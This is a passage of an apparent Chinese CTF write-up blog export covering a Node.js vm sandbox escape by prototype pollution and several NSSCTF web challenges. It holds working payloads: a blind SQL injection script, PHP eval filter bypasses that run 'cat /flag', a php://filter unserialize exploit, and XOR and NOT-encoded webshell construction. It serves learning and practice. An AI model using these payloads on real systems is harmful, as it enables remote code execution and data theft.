class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><br>直接使用replace来进行替换。这个方法实在是太逆天了</p>
<h2 id="官方方法：原型链污染"><a href="#官方方法：原型链污染" class="headerlink" title="官方方法：原型链污染"></a>官方方法：原型链污染</h2><p>我个人认为要想想到使用原型链污染。还是比较难的。解答出来的选手应该大部分都是通过绕waf进行解答的。<br>官方的方法是利用原型链污染来解题我们审计一下源码就会发现其会将(__filename)这个属性输出回显。而我们在上面绕过vm沙箱里就知道。我们在绕过这个空沙箱首先要获取一个对象再对对象进行原型链污染.<br>我们可以使用如下payload对文件进行读取<br>我们可以在本地调试查看其原型链的长度以此来找到object。对其进行污染<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__filename</span>=<span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p>
<p>在进一步进行污染将__filename污染为/app/hack.js可以读取会发现hack.js里导入了shell.js在shell.js里我们可以看到command是被包裹在execSync里的。而且process里并不含有command这个属性明显这个也是可以原型链污染的且其是RCE的重点。<br><figure class="highlight js"><figcaption><span>hack.js</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;shell.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight js"><figcaption><span>shell.js</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p.<span class="title function_">execSync</span>(process.<span class="property">env</span>.<span class="property">command</span>);</span><br></pre></td></tr></table></figure><br>但是直接污染是无法执行的.我们需要看这篇文章<a href="https://hujiekang.top/posts/nodejs-require-rce/。">https://hujiekang.top/posts/nodejs-require-rce/。</a></p>
<p>这个文章强度多少有点高了，先挖个坑等以后对js了解更深了在补上。</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF刷题1(内有无字符数字RCE)</title>
    <url>/2024/03/18/NSSCTF%E5%88%B7%E9%A2%981(%E5%86%85%E6%9C%89%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE)/</url>
    <content><![CDATA[<h1 id="实在不知道干点什么了，正好之前抽到NSS的vip，刷刷题，学习学习。"><a href="#实在不知道干点什么了，正好之前抽到NSS的vip，刷刷题，学习学习。" class="headerlink" title="实在不知道干点什么了，正好之前抽到NSS的vip，刷刷题，学习学习。"></a>实在不知道干点什么了，正好之前抽到NSS的vip，刷刷题，学习学习。</h1><h1 id="CISCN-2019华北Day2-Web1-盲注"><a href="#CISCN-2019华北Day2-Web1-盲注" class="headerlink" title="[CISCN 2019华北Day2]Web1(盲注)"></a>[CISCN 2019华北Day2]Web1(盲注)</h1><p>陈年老题了，打开就提醒我们注入，把表和列名都说了。那么我们尝试一下就会发现可以进行异或注入并且过滤了空格。我们可以使用%0a或者括号来绕过，之后就是布尔盲注了<br>exp<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28454/index.php&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;id=1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        r = requests.post(url, data=payload)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><br>很奇怪明明在hackbar上可以使用%0a来绕过但是在python上就不可以了</p>
<h1 id="CISCN-2019初赛-Love-Math-利用数学函数进行构造"><a href="#CISCN-2019初赛-Love-Math-利用数学函数进行构造" class="headerlink" title="[CISCN 2019初赛]Love Math(利用数学函数进行构造)"></a>[CISCN 2019初赛]Love Math(利用数学函数进行构造)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到代码我们回发现我们输入的字母只能是特定的数学函数。那么这道题目的目的就是要利用数学函数来转换10进制字符成字母。这时候我们可以讲10进制转换成36进制。36进制包含了所有的英文字母。我们可以使用base_convert来将10进制变成想要的字符<br>我们使用下面这个网站来进行进制转换<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://tool.ip138.com/hexconvert/</span><br></pre></td></tr></table></figure><br>我们有几种思路，1是直接转换出system(‘cat /flag’)这样的2.是经过逃逸。</p>
<h2 id="构建system-getallheaders-1"><a href="#构建system-getallheaders-1" class="headerlink" title="构建system(getallheaders(){1})"></a>构建system(getallheaders(){1})</h2><p>正常原本应该使用system(getallheaders()[1])但是因为<code>[</code>被过滤了导致我们只能使用{}来代替。其1代表标头名称。构建方法是构建字符串system加上()再构建getallheaders加上(){1}<br>最后摆标头传入命令执行的指令<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=base_convert(1751504350,10,36)(base_convert(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure><br>这里构建getallheaders需要使用30进制因为36进制的进行转换后字符会发生改变。base_convert(1751504350,10,36)构建<code>system</code>(base_convert(8768397090111664438,10,30)(){1})构建(getallheaders()[1])括号可以直接加，再php中字符直接加括号会被直接认为函数进行调用。</p>
<h2 id="构建-GET进行逃逸"><a href="#构建-GET进行逃逸" class="headerlink" title="构建_GET进行逃逸"></a>构建_GET进行逃逸</h2><p>我们可以使用hex2bin来进行构建_GET(因为我们构造的字符串$_GET{1}只是字符串，不会被当成全局变量，所有我们要构造<code>_GET</code>将_GET传到一个变量中再进行变量覆盖)，hex2bin需要使用base_convert来进行构造。base_convert(37907361743,10,36)()代表函数hex2bin()我们再括号里再对10进制字符进行转换为16进制字符_GET。payload如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$abs=base_convert(37907361743,10,36)(dechex(1598506324));$$abs&#123;0&#125;($$abs&#123;1&#125;)&amp;0=system&amp;1=cat /flag</span><br></pre></td></tr></table></figure><br>注意变量名要为数学函数</p>
<h1 id="CISCN-2023-华北-ez-date-date函数返回原参数"><a href="#CISCN-2023-华北-ez-date-date函数返回原参数" class="headerlink" title="[CISCN 2023 华北]ez_date(date函数返回原参数)"></a>[CISCN 2023 华北]ez_date(date函数返回原参数)</h1><p>难度并不是特别高，这一题唯一的盲点就是如何使date()返回值为原值。因为是刷题我就直接看了wp发现当date()接受有的参数经过了<code>\</code>的转义如下<code>\f\l\a\g</code>把传入flag的每个值都经过转义时，date()的返回值就是原值flag。<br>好了知识前提结束，上源码。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br></pre></td></tr></table></figure><br>我们先分析一下这个正则匹配我们会发现其只匹配空白字符如空格等，那么对我们来说这个替换函数可以说是形同虚设了。<br>我们的目的是要将<code>$data</code>设为php伪协议来进行文件读取。<br>我们首先要绕过<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )</span><br></pre></td></tr></table></figure><br>可以看到其先进行a和b的强相等比较。再继续md5值和sha1值继续比较。我们可以直接使用数字1和字符1来通过强相等，又因为加密的都是1则其可以通过<br>绕过就是构造file为伪协议，并且通过\转义来通过date()函数.<br>exp<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;\p\h\p\:\/\/\f\i\l\t\e\r\/\c\o\n\v\e\r\t\.\b\a\s\e\6\4\-\e\n\c\o\d\e\/\r\e\s\o\u\r\c\e\=/\f\l\a\g&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><br>我尝试了一下无法使用php://input;来进行命令执行。所以只好使用filter来猜测和找文件位置和名字了。</p>
<h1 id="SWPUCTF-2021-新生赛-hardrce-取反绕过"><a href="#SWPUCTF-2021-新生赛-hardrce-取反绕过" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce(取反绕过)"></a>[SWPUCTF 2021 新生赛]hardrce(取反绕过)</h1><h2 id="P神博客"><a href="#P神博客" class="headerlink" title="P神博客"></a><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神博客</a></h2><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>这道题目我们需要用到取反绕过<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><br>我们查看源码会发现其将字母和和一些特殊字符给过滤了，这就导致我们无法使用异或来进行拼接字符绕过。这时候我们尝试使用取反绕过</p>
<h2 id="取反绕过的概念"><a href="#取反绕过的概念" class="headerlink" title="取反绕过的概念"></a>取反绕过的概念</h2><p>首先php中有的符合~为取反，即二进制中的取反，我们可以将我们想要构造的字符进行取反，而取反的结果一般不是正常的字母和特殊字符。这就导致我们可以绕过waf。<br>如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">-----------</span><br><span class="line">%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span></span><br></pre></td></tr></table></figure><br>我们可以看道我们对字符进行取反后再进行urlencode这是为了正常传参。<br>当我们传参道eval函数里时可以如下方法进行传参<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=(~%8F%97%8F%96%91%99%90)()</span><br></pre></td></tr></table></figure><br><code>(~%8F%97%8F%96%91%99%90)</code>构造为phpinfo再直接拼接()就成了phpinfo()会被直接执行。<br>那么这题的题解就一目了然了<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>);</span><br></pre></td></tr></table></figure></p>
<h1 id="HUBUCTF-2022-新生赛-HowToGetShell"><a href="#HUBUCTF-2022-新生赛-HowToGetShell" class="headerlink" title="[HUBUCTF 2022 新生赛]HowToGetShell"></a>[HUBUCTF 2022 新生赛]HowToGetShell</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$mess</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mess&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,<span class="variable">$mess</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;invalid input!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$mess</span>);</span><br></pre></td></tr></table></figure>
<p>这道题目可以说是比较简单的，但是三种绕过都可以实现所以拿来学习是非常好的。<br>首先是异或绕过<br>我们可以通过特殊字符的异或来构造我们想要的字符。我们这里直接贴脚本<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;_&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$num</span> = <span class="number">0</span>; <span class="variable">$num</span> &lt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>); <span class="variable">$num</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">33</span>; <span class="variable">$x</span> &lt;= <span class="number">126</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">33</span>; <span class="variable">$y</span> &lt;= <span class="number">126</span>; <span class="variable">$y</span>++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>))) &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>) ^ <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>]) &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个脚本的原理也很简单，就是将想要的字符串一个个转为ascii码再进行遍历异或，最终输出可以异或出来的特殊字符。<br>思路我们要构造如下<code>assert($_POST[_]);</code>来进行逃逸<strong>注意:7.0版本的需要构造<code>$_POST</code>进行逃逸</strong><br>构造思路如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;<span class="comment">#$_=asser</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;<span class="comment">#$__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span 